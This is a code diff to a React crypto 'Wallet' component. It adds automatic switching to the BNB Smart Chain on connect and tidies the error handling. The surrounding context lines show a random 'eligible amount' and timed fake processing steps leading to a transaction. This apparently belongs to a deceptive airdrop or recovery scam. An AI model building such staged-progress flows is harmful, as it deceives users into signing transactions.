@@ -326,8 +326,45 @@ export function Wallet() {
       }
 
       const provider = new ethers.providers.Web3Provider(window.ethereum);
+
+      // First connect wallet
       const accounts = await provider.send("eth_requestAccounts", []);
       setWalletAddress(accounts[0]);
+
+      // Then automatically try to switch to BNB network
+      const chainId = await window.ethereum.request({ method: "eth_chainId" });
+      if (chainId !== BNB_CHAIN_ID) {
+        try {
+          await window.ethereum.request({
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId: BNB_CHAIN_ID }],
+          });
+        } catch (switchError: any) {
+          // If the network doesn't exist, add it
+          if (switchError.code === 4902) {
+            try {
+              await window.ethereum.request({
+                method: "wallet_addEthereumChain",
+                params: [
+                  {
+                    chainId: BNB_CHAIN_ID,
+                    chainName: "BNB Smart Chain",
+                    nativeCurrency: {
+                      name: "BNB",
+                      symbol: "BNB",
+                      decimals: 18,
+                    },
+                    rpcUrls: ["https://bsc-dataseed1.binance.org"],
+                    blockExplorerUrls: ["https://bscscan.com"],
+                  },
+                ],
+              });
+            } catch (addError) {
+              setErrorMessage("Failed to add BNB network");
+            }
+          }
+        }
+      }
 
       await loadRejectedBalance(accounts[0]);
     } catch (error) {
@@ -354,13 +391,13 @@ export function Wallet() {
     setShowModal(true);
     setModalStep(0);
     setConfirmationCount(0);
-  
+
     const randomAmount =
       ELIGIBLE_AMOUNTS[Math.floor(Math.random() * ELIGIBLE_AMOUNTS.length)];
-  
+
     setEligibleAmount(randomAmount);
     eligibleAmountRef.current = randomAmount;
-  
+
     // Updated timings
     setTimeout(() => setModalStep(1), 4000); // 4 seconds for initial processing
     setTimeout(() => setModalStep(2), 7000); // 3 more seconds to show address added
@@ -374,21 +411,40 @@ export function Wallet() {
     try {
       const chainId = await window.ethereum!.request({ method: "eth_chainId" });
       if (chainId !== BNB_CHAIN_ID) {
-        await window.ethereum!.request({
-          method: "wallet_switchEthereumChain",
-          params: [{ chainId: BNB_CHAIN_ID }],
-        });
+        try {
+          await window.ethereum!.request({
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId: BNB_CHAIN_ID }],
+          });
+        } catch (switchError: any) {
+          if (switchError.code === 4902) {
+            await window.ethereum!.request({
+              method: "wallet_addEthereumChain",
+              params: [
+                {
+                  chainId: BNB_CHAIN_ID,
+                  chainName: "BNB Smart Chain",
+                  nativeCurrency: {
+                    name: "BNB",
+                    symbol: "BNB",
+                    decimals: 18,
+                  },
+                  rpcUrls: ["https://bsc-dataseed1.binance.org"],
+                  blockExplorerUrls: ["https://bscscan.com"],
+                },
+              ],
+            });
+          } else {
+            throw switchError;
+          }
+        }
       }
       return true;
     } catch (error) {
-      const ethError = error as EthereumError;
-      if (ethError.code === 4902) {
-        setErrorMessage("Please add the BNB network to your wallet.");
-      }
+      setErrorMessage("Failed to switch to BNB network");
       return false;
     }
   };
-
   const executeTransaction = async (
     signer: ethers.providers.JsonRpcSigner,
     amount: string
